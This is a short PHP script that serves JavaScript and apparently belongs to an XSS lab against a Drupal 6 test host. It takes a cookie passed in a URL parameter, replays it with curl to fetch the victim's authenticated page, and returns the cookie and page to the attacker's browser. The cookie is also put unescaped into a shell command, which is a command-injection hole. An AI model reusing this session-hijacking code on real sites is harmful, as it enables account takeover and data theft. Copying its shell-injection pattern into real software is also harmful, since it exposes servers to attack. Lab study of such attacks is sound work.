<?php
header('Content-Type: text/javascript');
$cookie = isset($_GET['q']) ? $_GET['q'] : '';

$data = '';
if ($cookie != '') {
	$cmd = 'curl -b "' . $cookie . '" http://drupal6.lab/xss2.php';
	$data = `$cmd`;	
}

echo 'var cookie="' . $cookie . '";' . "\n";
echo 'var data=' . json_encode($data) . "\n";
?>

console.log('Your cookie: ' + cookie);
console.log('Your data: ' + data);
